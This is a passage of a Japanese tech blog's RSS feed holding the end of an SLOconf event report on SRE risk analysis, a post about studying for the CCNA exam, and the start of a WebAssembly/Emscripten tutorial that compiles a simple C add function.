418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(2278,0)"></path></g></g><g data-mml-node="mrow" transform="translate(6440.7,-686)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(764,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(1468,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(2172,0)"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g></g><rect width="15562.3" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></p><ul><li>リスク分析表の一例<ul><li>年間停止時間が長い項目ほどリスクが高いことを示します。</li></ul></li></ul></li></ul><div class="scroll"><table><thead><tr><th>No</th><th>リスク</th><th>ETTD<br>問題の検出時間</th><th>ETTR<br>問題の回復時間</th><th>Implact<br>影響を与えたユーザーの割合</th><th>ETTF<br>次の障害発生までの時間</th><th>年間停止時間<br>左の4数値に基づいて計算した値</th></tr></thead><tbody><tr><td>1</td><td>設定ミスでノード数をへらしてしまい、これによる過負荷でリクエストを取りこぼす</td><td>30分</td><td>120分</td><td>20%</td><td>120日</td><td>91時間</td></tr><tr><td>2</td><td>新しいリリースが半分のリクエストにエラーを引き起こすが、慣れていないロールバック手順のために復旧に時間がかかる</td><td>5分</td><td>120分</td><td>50%</td><td>180日</td><td>127時間</td></tr><tr><td>3</td><td>誤ってデータベースを削除してしまい、バックアップから復旧する</td><td>5分</td><td>510分</td><td>100%</td><td>1460日</td><td>129時間</td></tr><tr><td>4</td><td>クラウドプロバイダーのゾーン障害で、全体の3分の1のリクエストを取りこぼす。該当ゾーンを外し、他のゾーンにノードを追加するが、キャパシティ不足でデプロイできない。</td><td>5分</td><td>960分</td><td>33%</td><td>365日</td><td>319時間</td></tr></tbody></table></div><h3 id="感想-2"><a href="#感想-2" class="headerlink" title="感想"></a>感想</h3><ul><li>SLOの脅威となるものはなにか？SLIとインシデントの時系列図を使って指標を可視化する</li><li>心理的安全性を確保することで、インシデントを次の改善につなげていく</li><li>人間が正しく評価することが苦手なリスク分析をSLIの指標を使ってリスク分析する</li></ul><p>大きく三点にわたって話された内容は、Google流のSREポリシーが肌感覚でわかる非常に面白い講演でした。</p><p>個人的には、特に最後の「Net Error Budget Impact」を用いてリスク分析を行うあたりが、関心を引きました。ETTF(次の障害発生までの時間)が分類によってはどうにもなるので難しいところではありますが、こういった用途にも使えるのかと新鮮な驚きがありました。</p><p>この内容についてさらに深堀したいなと思ったところでググったところ、ニフティのテックブログで、本講演のリスク分析のテンプレートファイルについて詳細な解説記事が上がっていました。この場を借りて、ご紹介させていただきます。</p><p>関連リンク: 「<a href="https://engineering.nifty.co.jp/blog/13413">SRE的なリスク分析手法を試してみた</a>」</p><h2 id="LuupにおけるSLOの物語"><a href="#LuupにおけるSLOの物語" class="headerlink" title="LuupにおけるSLOの物語"></a>LuupにおけるSLOの物語</h2><p>スライド資料: <a href="https://speakerdeck.com/grimoh/luupniokeruslonowu-yu">https://speakerdeck.com/grimoh/luupniokeruslonowu-yu</a></p><h3 id="話された内容-3"><a href="#話された内容-3" class="headerlink" title="話された内容"></a>話された内容</h3><p>電動キックボードや自転車などのシェアリング事業を展開するLuupで、SREとして働いているぐりもあさんに「LuupにおけるSLOの物語」というタイトルで、Luupで実践しているSLO運用について語っていただきました。</p><ul><li>アジェンダ<ul><li>Luup SREチーム<ul><li>どんなことをしてるか</li><li>どんなチームとコラボレーションしてるか</li></ul></li><li>LuupにおけるSLO<ul><li>CUJ、CMC</li><li>SLO</li></ul></li><li>LuupにおけるSLO運用<ul><li>SLO定期見直し</li><li>SLO違反対応</li><li>BurnRateAlert対応</li><li>Luup Case Study: Unlock</li><li>Enabling SRE活動</li></ul></li><li>Luup SREチームの今後について</li></ul></li></ul><div class="note info" style="background: #e5f8e2; padding:16px; margin:24px 12px; border-radius:8px;">  <span class="fa fa-fw fa-check-circle"></span><p>資料をご一読していただければ、講演内容の概要は分かると思うので、個別の概要については説明せず、感想にて自分が重要だと感じたことをピックアップしていく形を取りたいと思います。</p></div><h3 id="感想-3"><a href="#感想-3" class="headerlink" title="感想"></a>感想</h3><h4 id="SLIについて"><a href="#SLIについて" class="headerlink" title="SLIについて"></a>SLIについて</h4><p>SLOの設定にあたり、どのような指標(SLI)を取るか。これはビジネスや提供するサービスによって大きく異なり、他社を参考に簡単に正解が見えてくるものではありません。</p><p>Luupさんには自分も上京した時にはよくお世話になっておりますが、電動キックボードや自転車など実機を扱うという点で、難易度の高い問題が更に複雑になったかと存じます。</p><p>たとえば、利用しようと思ったらスマホアプリで操作してQRコードを開いてリモートで鍵を解除してもらって…と一連のイベントが発生します。</p><p>この一連の流れの中で、Luup社はいったい何を計測すれば顧客体験の改善につながると判断したか？</p><p>そのスタンスを表現したのが、次のスライドでした。</p><img src="/images/20230518b/20230516_SLOconTokyo-15.png" alt="" width="1200" height="675" loading="lazy"><p>通常のSREの文脈でよく使われるCUJ(Critical User Journey)を用いつつも、Luup独自のCMC(Critical Machine Communication)という計測対象を独自に定義し、CUJ(人)とCMC(マシン)の両側面からSLIを策定したそうです。</p><p>こういうポリシー策定って地味ですが重要な観点だと思います。さらに、そういった定義が必要になるということから逆説的にビジネスドメインが見えてくるのが面白いですね。</p><h4 id="LuupにおけるSLO運用について"><a href="#LuupにおけるSLO運用について" class="headerlink" title="LuupにおけるSLO運用について"></a>LuupにおけるSLO運用について</h4><p>全体を通して、サイトリライアビリティワークブックにある内容を手堅くやっているなという印象でしたが、特にSLO見直しのケーススタディとして取り上げられていた「Unlock Availability SLO違反」の事例は、共感度が高かったです。</p><p>Luupの電動キックボードや自転車を利用するためには、スマホアプリを使って遠隔操作でロックを解除する必要があります。この遠隔操作の可用性に関するサービスレベル目標を定めたものが「Unlock Availability SLO」ですが、見直した結果、エラーバジェットに影響を及ぼしている二つの要因が分かったそうです。</p><img src="/images/20230518b/20230516_SLOconTokyo-34.png" alt="" width="1200" height="675" loading="lazy"><p>特に後者のような、実機が絡み、リトライによって自動的に解決されるような問題は、なかなか適切なSLOの設定が難しいところです。「How I learned to stop worrying and love burn rates」でもフレイキーページとして説明されていたエラーイベントですね。</p><p>しかし、鍵が解除できないと実機を借りられず、少なくとも一人のユーザーの顧客体験を大きく損なってしまうので、こういうイベントはなるべく避けたいし、解消したいものです。顧客体験と開発リソースの狭間で、IoTデバイス特有のSLO運用の難しさがよくわかった事例でした。</p><h2 id="最後に"><a href="#最後に" class="headerlink" title="最後に"></a>最後に</h2><p>昨年、OpenSLOに関する記事を書きました。<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></p><p><a href="https://future-architect.github.io/articles/20220518a/">https://future-architect.github.io/articles/20220518a/</a></p><p>あれから一年後、同じNobl9社を通してSLOconfというイベントに参加でき、貴重な経験になりました。特に、講演中の周りの反応…ざわめきだったり、どこでスライド資料の写真を撮っていたのか後ろの方に座っていたのでよくわかったのですが、こうしたところに改めてオフラインイベントの良さを感じました。イベントを開催した関係各社様にお礼申し上げます。</p><p>最後に二つばかり宣伝をさせてください。</p><p>この記事の途中で触れた、Nobl9のAlex Hidalgoさんが書いた「Implementing Service Level Objectives」(サービスレベル目標の実装)という書籍ですが、7月に「SLO サービスレベル目標(仮タイトル)」という名前で日本語訳が出版されるそうです。</p><p><a href="https://twitter.com/shotaTsuge/status/1658408285803008000?s=20">https://twitter.com/shotaTsuge/status/1658408285803008000?s=20</a></p><p>また、SRE向けのテックカンファレンス、SRE NEXT 2023が今年も開催されるそうです。9月下旬を予定しているとのことなので、気長に待ちましょう。</p><p><a href="https://twitter.com/ymotongpoo/status/1658448191346589697?s=20">https://twitter.com/ymotongpoo/status/1658448191346589697?s=20</a></p><p>どちらも楽しみですね。</p><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style:none; padding-left: 0;"><li id="fn:1"><span style="vertical-align: top; padding-right: 10px;">1.</span><span style="vertical-align: top;">OpenSLOは今回SLOconfを主催したNobl9社のメンバが中心となって策定した、SLOを定義するためのオープンな仕様です...実はブログを書いてからほとんど動きがなくなってしまい、ちょっと残念ではあります</span><a href="#fnref:1" rev="footnote"> ↩</a></li></ol></div></div>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%8F%82%E5%8A%A0%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88/">参加レポート</category>
      
      <category domain="https://future-architect.github.io/tags/SRE/">SRE</category>
      
      <category domain="https://future-architect.github.io/tags/SLO/">SLO</category>
      
      <category domain="https://future-architect.github.io/tags/SLOconf/">SLOconf</category>
      
      
      <comments>https://future-architect.github.io/articles/20230518b/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ネットワーク入門としてCCNA試験を受験してみた</title>
      <link>https://future-architect.github.io/articles/20230518a/</link>
      <guid>https://future-architect.github.io/articles/20230518a/</guid>
      <pubDate>Wed, 17 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;TIG DX ユニット 佐々木です。&lt;br&gt;&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>TIG DX ユニット 佐々木です。<br><a href="/articles/20230417a/">春の入門祭り連載</a> 19 日目を担当します。</p><p>2022 年 4 月に Future に新卒入社して 1 年ほど経ちました。入社以来、AWS を利用した Web システムの設計・開発に従事していますが、システムを構築する上で必要なインフラ・ネットワーク・DB 等の知識は、業務に必要な範囲で部分的に調査・理解することが多いです。</p><p>今回は、システムを構築する要素を体系的・網羅的に学習する機会を求め、ネットワーク入門として CCNA 試験の勉強・受験・結果的に合格まで至った感想についてお話しします。</p><p>本記事では、ネットワーク初学者の私がどのような状態を目指して CCNA 試験の勉強を始め、その結果どれだけ近づけたかについてお話しできればと思います。</p><p>ネットワーク知識の詳細な説明は主な目的ではありません。</p><h2 id="CCNA-とは？"><a href="#CCNA-とは？" class="headerlink" title="CCNA とは？"></a>CCNA とは？</h2><p>Cisco Certified Network Associate を略して CCNA と呼びます。 CCNA は、Cisco Systems 社によって運営されているベンダー資格です。試験では、ネットワーキング設計、セキュリティ、および自動化に関する幅広い基礎知識が求められるほか、具体的なネットワーク構築スキルも問われます。そのため、 Cisco 製品を正しく扱う知識や技術も学習しました。</p><p>特定企業の製品の取り扱い方法を知っても…と思われるかもしれませんが、Cisco Systems 社は、国内ネットワーク機器分野において、2021 年時点で 48.1% と高いシェアを誇っており(図 1)、 Cisco 製品を正しく扱えることはスタンダードなネットワーク構築スキルの証明とも言えるかと思います。</p><img src="/images/20230518a/image.png" alt="Ciscoのシェアが高いことが分かる円グラフ" width="500" height="348" loading="lazy">図 1：国内ネットワーク機器市場、ベンダー別の支出額シェア実績、2021 年（出典：IDC Japan）<h2 id="その他のネットワーク試験との比較"><a href="#その他のネットワーク試験との比較" class="headerlink" title="その他のネットワーク試験との比較"></a>その他のネットワーク試験との比較</h2><p>ネットワーク系の資格としてはその他に、AWS 認定資格やネットワークスペシャリスト、CCNA の上位資格である CCNP を取得した・取得する予定だという声をよく耳にします。私の個人的な意見として、それぞれの資格について簡単に比較したいと思います。</p><h3 id="CCNA"><a href="#CCNA" class="headerlink" title="CCNA"></a>CCNA</h3><ul><li>Cisco のベンダー資格</li><li>ネットワーク・セキュリティ・自動化などの基礎知識 + Cisco 製品への理解が求められる</li><li>3 年間のみ有効であり、失効前に再受験し、更新が必要</li><li>受験料：42,900 円（税込）（高い）</li><li>年に何度でもオンラインでも受験できる</li></ul><h3 id="AWS-認定資格"><a href="#AWS-認定資格" class="headerlink" title="AWS 認定資格"></a>AWS 認定資格</h3><ul><li>AWS のベンダー資格</li><li>AWS サービスとその運用に関する知識が求められる</li><li>ネットワーク・セキュリティ・自動化などの概念や基礎は前提知識であり、問われることは少ない</li><li>3 年間のみ有効であり、失効前に再受験し、更新が必要</li><li>受験料：11,000 円〜30,000（税込）（レベルによって異なる）</li><li>年に何度でもオンラインでも受験できる</li></ul><h3 id="ネットワークスペシャリスト（ネスぺ）"><a href="#ネットワークスペシャリスト（ネスぺ）" class="headerlink" title="ネットワークスペシャリスト（ネスぺ）"></a>ネットワークスペシャリスト（ネスぺ）</h3><ul><li>国家資格</li><li>通信に関する幅広い知識に留まらず、IT 全般・マネジメントやストラテジ系の知識も求められる</li><li>設計課題はあるものの、実際の構築・設定のスキルは求められない</li><li>一度取得すれば、更新の必要性がない</li><li>受験料：5,700 円（税込）</li><li>年１回の対面受験のチャンスしかない</li><li>4 つの試験に合格する必要があり、時間にすると 9:30 ～ 16:30(1 日中テスト)</li></ul><h2 id="CCNA-試験を選んだ理由"><a href="#CCNA-試験を選んだ理由" class="headerlink" title="CCNA 試験を選んだ理由"></a>CCNA 試験を選んだ理由</h2><p>私は中長期的に、システムアーキテクチャの全体設計について議論できる状態になりたいと考えていました。<br>達成のためには業務経験はもちろんのこと、システムを構成するインフラ・ネットワーク・DB など幅広い知識を体系的・網羅的に有する必要があるかと思います。<br>応用情報技術者資格の取得を通じて基礎的な部分については抑えられた(はずな)ので、各分野について深掘りしていきたく、手始めにネットワーク関連の知識を習得する方法として以下の 4 つを候補として考えていました。</p><ol><li>ネットワーク関連の技術書を色々読む</li><li>AWS 認定資格取得に必要な知識を有する</li><li>ネットワークスペシャリスト取得に必要な知識を有する</li><li>CCNA・CCNP 資格に必要な知識を有する</li></ol><h3 id="1-ネットワーク関連の技術書を色々読む"><a href="#1-ネットワーク関連の技術書を色々読む" class="headerlink" title="1. ネットワーク関連の技術書を色々読む"></a>1. ネットワーク関連の技術書を色々読む</h3><p>色々本を読んで知識のインデックスを貼っていくのも良いのかもしれないのですが、基礎的な部分は頭の引き出しからスッと出せる状態にしたいと私は考えていました。<br>私は本から知識をインプットするだけでは頭の引き出し入れることができないため、何かアウトプットする機会が必要と考えて、この案は無くなりました。</p><h3 id="2-AWS-認定資格取得に必要な知識を有する"><a href="#2-AWS-認定資格取得に必要な知識を有する" class="headerlink" title="2. AWS 認定資格取得に必要な知識を有する"></a>2. AWS 認定資格取得に必要な知識を有する</h3><p>モダンなシステムはオンプレではなく AWS や Google Cloud などの Cloud プラットフォームを用いて構築することが多いことから、AWS 認定資格を身近に感じていました。<br>しかし、AWS 認定試験では AWS サービスの仕様・運用方法を問われることが多く、ネットワーキングやセキュリティについて直接問われることが少ないため、ネットワーク知識を体系的に学ぶ機会としては適していないと考え、この案は無くなりました。</p><h3 id="3-ネットワークスペシャリスト取得に必要な知識を有する"><a href="#3-ネットワークスペシャリスト取得に必要な知識を有する" class="headerlink" title="3. ネットワークスペシャリスト取得に必要な知識を有する"></a>3. ネットワークスペシャリスト取得に必要な知識を有する</h3><p>試験合格には通信に関する網羅的な知識が必要なほか、試験内容にネットワークの設計課題もあることから、なりたい状態に近づけるのはこれだ！と感じました。<br>しかし、試験内容が想像以上に高難易度で身の丈に合っていないほか、年 1 開催ということもあり敷居の高さを感じたため、この試験の前にファーストステップを踏むこととしました。</p><p>そのファーストステップとして選んだのが CCNA でした。ネットワーキング・セキュリティ・自動化などの基礎知識が幅広く求められ、試験も随時開催であることから取っ掛かりやすさを感じました。</p><h2 id="CCNA-試験を通じて、なりたい状態に近づけたのか"><a href="#CCNA-試験を通じて、なりたい状態に近づけたのか" class="headerlink" title="CCNA 試験を通じて、なりたい状態に近づけたのか"></a>CCNA 試験を通じて、なりたい状態に近づけたのか</h2><p>中長期的に、システムアーキテクチャの全体設計について議論できる状態になりたいと言っていましたが、CCNA 合格に必要な知識を取得しただけではネットワーク設計に対して誰かと議論はできそうにないです。<br>ただ、既存設計のシステム構成についてある程度言語化したり、実際に構築するイメージを身に付けることはできたと感じています。</p><p>知識を蓄えるだけでなく、ネスぺの設計課題に取り組んだり、システム設計業務を通じて試行錯誤する経験を積むことで、徐々に議論できるようになるのかなと思うので、その足掛かりとしては有益だったと感じます。</p><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>今回私はネットワーク入門として</p><ul><li>アウトプットする場を求めて技術書を読むだけではなく、</li><li>サービスの仕様・運用方法の理解が求められる AWS 認定資格ではなく、</li><li>体系的なネットワーク知識や、設計課題を解く力が求められるネットワークスペシャリスト資格の足掛かりとして、</li></ul><p>CCNA 試験の勉強をしました。</p><p>まだネットワーク初学者で、これから深掘りしていきたいという方にとっては、<br>ファーストステップとして取っ掛かりやすいとは思うので、候補の 1 つとして考えてみてはいかがでしょうか。<br>ただ受験料が 42,900 円（税込）とかなり高額なので、資格取得の支援があれば嬉しいですね…</p><p>本記事は以上です。春の入門祭り連載、続いては小橋さんの「technology radar を見てみよう」です！</p><p>私はしばらく新作ゼルダの世界へ行ってきます。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/Network/">Network</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%90%88%E6%A0%BC%E8%A8%98/">合格記</category>
      
      <category domain="https://future-architect.github.io/tags/CCNA/">CCNA</category>
      
      
      <comments>https://future-architect.github.io/articles/20230518a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>WebAssemblyとEmscriptenに入門した</title>
      <link>https://future-architect.github.io/articles/20230517a/</link>
      <guid>https://future-architect.github.io/articles/20230517a/</guid>
      <pubDate>Tue, 16 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230517a/Emscripten_logo_full.png&quot; alt=&quot;&quot; width=&quot;612&quot; height=&quot;167&quot; loading=&quot;lazy&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230517a/Emscripten_logo_full.png" alt="" width="612" height="167" loading="lazy"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>はじめまして。2022年4月入社、金融グループ所属の森です。</p><p><a href="/articles/20230417a/">春の入門ブログ連載</a>の19日目の記事です。</p><p>WebAssembly&#x2F;Emscriptenに入門した際の流れや気付きについて紹介します。</p><p>内容としては、</p><ol><li>WebAssemblyの概要</li><li>Emscriptenの概要</li><li>EmscriptenでCをWebAssemblyにコンパイルする方法</li><li>JavaScriptからの呼び出し方</li></ol><p>について触れます。</p><h2 id="1-WebAssemblyの概要"><a href="#1-WebAssemblyの概要" class="headerlink" title="1. WebAssemblyの概要"></a>1. WebAssemblyの概要</h2><p>WebAssemblyは</p><ul><li>CやRustなどで書いたコードから生成することができる</li><li>ウェブ上でJavaScriptと一緒に動く</li><li>高速に動作する</li></ul><p>以上のような特徴を持った言語で、<strong>Wasm</strong>という略称を持っています。</p><p>CやRustで書いた既存のソースコードを使用したいケースや、3D処理のような実行速度が求められるケースで活用できそうです。</p><h2 id="2-Emscriptenの概要"><a href="#2-Emscriptenの概要" class="headerlink" title="2. Emscriptenの概要"></a>2. Emscriptenの概要</h2><p>EmscriptenはC&#x2F;C++をWebAssemblyにコンパイルするツールです。</p><p>UnrealEngineやUnityなどのゲームエンジンや、QtのようなアプリケーションフレームワークをWasmに変換するためなどに利用されています。その他にも多くの利用例が<a href="https://github.com/emscripten-core/emscripten/wiki/Porting-Examples-and-Demos">wiki</a>にまとめられています。</p><h2 id="3-EmscriptenでCからWasmにコンパイルする"><a href="#3-EmscriptenでCからWasmにコンパイルする" class="headerlink" title="3. EmscriptenでCからWasmにコンパイルする"></a>3. EmscriptenでCからWasmにコンパイルする</h2><p>EmscriptenでC言語で書かれたソースコードをWasmにコンパイルします。Emscripten SDKの導入は<a href="https://emscripten.org/docs/getting_started/downloads.html">こちら</a>から行います。</p><h3 id="使用したCプログラム"><a href="#使用したCプログラム" class="headerlink" title="使用したCプログラム"></a>使用したCプログラム</h3><p><code>test.c</code> を以下の内容で作成します。<br>ここで定義している、2つの整数を受け取り和を返す関数 <code>add()</code> をブラウザから使用することを目指します。</p><p>エクスポートする関数は <code>EMSCRIPTEN_KEEPALIVE</code> というマクロで指定しています。<br>かわりにコンパイル時のオプションとして指定することも可能です。</p><figure class="highlight c"><figcaption><span>test.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;emscripten/emscripten.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">EMSCRIPTEN_KEEPALIVE</span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Wasmへのコンパイル"><a href="#Wasmへのコンパイル" class="headerlink" title="Wasmへのコンパイル"></a>Wasmへのコンパイル</h3><p>先程用意したCプログラムをWasmにコンパイルします。<br>コマンドは以下の通りです。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc -o test.js test.c -sEXPORTED_RUNTIME_METHODS=ccall,cwrap</span><br></pre></td></tr></table></figure><p>このコマンドを実行することによって <code>test.wasm</code> と <code>test.js</code> が出力されます。</p><p><code>test.wasm</code> はCプログラムが変換されたバイナリです。<br><code>test.js</code> は <code>test.wasm</code> をコンパイル、インスタンス化する内容などを含むJavaScriptファイルです。</p><p><code>-sEXPORTED_RUNTIME_METHODS=ccall,cwrap</code> というオプションによって、<code>test.js</code>にこれらのメソッドが追加されます。<code>ccall</code>,<code>cwrap</code> はどちらもエクスポートされたCの関数を呼び出すメソッドです。詳細は後ほど説明します。</p><p>また以下のようにコマンドを実行した場合、<code>test.js</code> を実行しブラウザに表示する <code>test.html</code> も出力することができます。<br>出力される <code>test.html</code> は今回の記事で説明しないものを多く含むので、htmlについては自分で作成したものを使用していきます。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc -o test.html test.c -sEXPORTED_RUNTIME_METHODS=ccall,cwrap</span><br></pre></td></tr></table></figure><h2 id="4-JavaScriptからWasmを呼び出す"><a href="#4-JavaScriptからWasmを呼び出す" class="headerlink" title="4. JavaScriptからWasmを呼び出す"></a>4. JavaScriptからWasmを呼び出す</h2><p>JavaScriptからコンパイルされたCの関数を呼び出す2種類の方法について試してみました。</p><h3 id="ccallを使用した方法"><a href="#ccallを使用した方法" class="headerlink" title="ccallを使用した方法"></a>ccallを使用した方法</h3><p>以下のようにhtmlを作成し、ブラウザで読み込んでみます。</p><figure class="highlight html"><figcaption><span>ccall.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span 